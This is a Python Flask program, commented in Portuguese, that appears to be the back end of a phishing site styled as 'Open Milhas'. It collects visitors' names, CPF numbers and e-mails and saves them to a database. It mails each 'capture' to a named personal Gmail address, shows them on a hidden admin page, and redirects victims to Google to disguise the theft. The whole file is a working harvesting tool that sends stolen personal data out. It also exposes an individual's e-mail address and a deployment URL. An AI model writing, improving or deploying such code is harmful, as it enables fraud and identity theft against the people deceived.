import os
import sqlite3
import smtplib
import threading  # Envia e-mail em segundo plano para o site não travar
from email.mime.text import MIMEText
from flask import Flask, render_template, request, redirect

app = Flask(__name__, template_folder='templates')

# --- CONFIGURAÇÃO DE NOTIFICAÇÃO ATUALIZADA ---
EMAIL_REMETENTE = "seu-email@gmail.com"
SENHA_APP = "sua-senha-de-16-digitos" # Lembre-se de gerar uma nova senha de app no Google
EMAIL_DESTINO = "jaquelinepisastefanelli@gmail.com" # Novo destino configurado

def enviar_email_async(dados):
    """Função que roda em paralelo para o site carregar instantaneamente"""
    corpo = f"""
    🔔 NOVA CAPTURA NO SITE 🔔
    --------------------------
    Nome: {dados.get('nome')}
    CPF: {dados.get('cpf')}
    E-mail: {dados.get('email')}
    --------------------------
    Painel Admin: https://openmilhas-1.onrender.com/admin_painel_secreto_99
    """
    msg = MIMEText(corpo)
    msg['Subject'] = '🔥 Nova Captura - Open Milhas'
    msg['From'] = EMAIL_REMETENTE
    msg['To'] = EMAIL_DESTINO

    try:
        # Timeout de 10 segundos para segurança da conexão
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10) as server:
            server.login(EMAIL_REMETENTE, SENHA_APP)
            server.sendmail(EMAIL_REMETENTE, EMAIL_DESTINO, msg.as_string())
    except Exception as e:
        print(f"Erro no envio do e-mail: {e}")

@app.route('/')
def index():
    return render_template('cadastro.html')

@app.route('/login', methods=['POST'])
def login():
    # Coleta os dados do formulário
    dados = {
        'nome': request.form.get('nome'),
        'cpf': request.form.get('cpf'),
        'email': request.form.get('email')
    }
    
    # 1. Salva no banco de dados para consulta no painel
    try:
        conn = sqlite3.connect('dados_bancarios.db')
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO usuarios (nome, cpf, email) 
            VALUES (?, ?, ?)
        ''', (dados['nome'], dados['cpf'], dados['email']))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Erro ao salvar no banco: {e}")

    # 2. Dispara a notificação para Jaqueline em segundo plano
    threading.Thread(target=enviar_email_async, args=(dados,)).start()
    
    # 3. Redireciona o cliente para o Google para disfarçar a ação
    return redirect("https://www.google.com")

@app.route('/admin_painel_secreto_99')
def admin():
    conn = sqlite3.connect('dados_bancarios.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM usuarios ORDER BY id DESC')
    usuarios = cursor.fetchall()
    conn.close()
    return render_template('admin.html', usuarios=usuarios)

if __name__ == '__main__':
    # Configuração de porta padrão para o Render
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)




